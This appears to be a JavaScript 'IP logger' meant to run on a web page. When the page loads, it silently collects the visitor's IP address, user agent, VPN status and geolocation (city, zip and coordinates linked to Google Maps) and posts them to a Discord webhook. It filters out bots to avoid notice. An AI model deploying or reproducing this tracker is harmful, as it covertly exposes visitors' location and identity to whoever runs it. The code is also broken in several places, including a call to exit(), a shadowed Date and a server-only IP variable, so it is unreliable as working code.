=

//Get the visitor's IP
const IP = (typeof window !== 'undefined' && window?.HTTP_CF_CONNECTING_IP) ? window.HTTP_CF_CONNECTING_IP : '';

//Stop the bots from logging
const browser = navigator.userAgent;
if (/(bot|Discord|robot|curl|spider|crawler|^$)/i.test(browser)) {
    exit();
}

//YOU CAN SET YOUR TIMEZONE HERE!
const currentDate = new Date();
const Date = currentDate.toLocaleDateString('en-GB');
const Time = currentDate.toLocaleTimeString('en-GB');

//Check if IP is a VPN (Is not always correct!)
const VPNConn = await fetch(`https://json.geoiplookup.io/${IP}`);
const VPNConnData = await VPNConn.json();
const VPN = VPNConnData.connection_type === 'Corporate' ? 'Yes' : 'No';

//Set some variables
const geoIPDetails = await fetch(`http://ip-api.com/json/${IP}`);
const Details = await geoIPDetails.json();
const Country = Details.country;
const CountryCode = Details.countryCode;
const Region = Details.regionName;
const City = Details.city;
const Zip = Details.zip;
const Lat = Details.lat;
const Lon = Details.lon;
const WebhookName = IP;

//Old method of getting a flag picture
//const Flag = `https://www.countryflags.io/${CountryCode}/flat/64.png`;
const FlagOLD = `https://raw.githubusercontent.com/stevenrskelton/flag-icon/master/png/75/country-4x3/${CountryCode}.png`;
const Flag = `https://countryflagsapi.com/png/${CountryCode}`;

class Discord {
    //This will run and send as soon as the page loads
    async Visitor() {
        const Webhook = "FULLURLHERE";

        const InfoArr = {
            username: WebhookName,
            avatar_url: Flag,
            embeds: [{
                title: `Visitor From ${Country}`,
                color: "39423",
                fields: [{
                        name: "IP",
                        value: IP,
                        inline: true
                    },
                    {
                        name: "VPN?",
                        value: VPN,
                        inline: true
                    },
                    {
                        name: "Useragent",
                        value: browser
                    },
                    {
                        name: "Country/CountryCode",
                        value: `${Country}/${CountryCode}`,
                        inline: true
                    },
                    {
                        name: "Region | City | Zip",
                        value: `[${Region} | ${City} | ${Zip}](https://www.google.com/maps/search/?api=1&query=${Lat},${Lon} 'Google Maps Location (+/- 750M Radius)')`,
                        inline: true
                    }
                ],
                footer: {
                    text: `${Date} ${Time}`,
                    //Alarm-clock icon for the footer. You could also download the image and set the icon_url to the image path
                    icon_url: "https://e7.pngegg.com/pngimages/766/619/png-clipart-emoji-alarm-clocks-alarm-clock-time-emoticon.png"
                },
            }],
        };

        const JSONData = JSON.stringify(InfoArr);

        const response = await fetch(Webhook, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSONData
        });

        return response;
    }
}

// Create an instance of the Discord class and call the Visitor method
const discord = new Discord();
discord.Visitor();
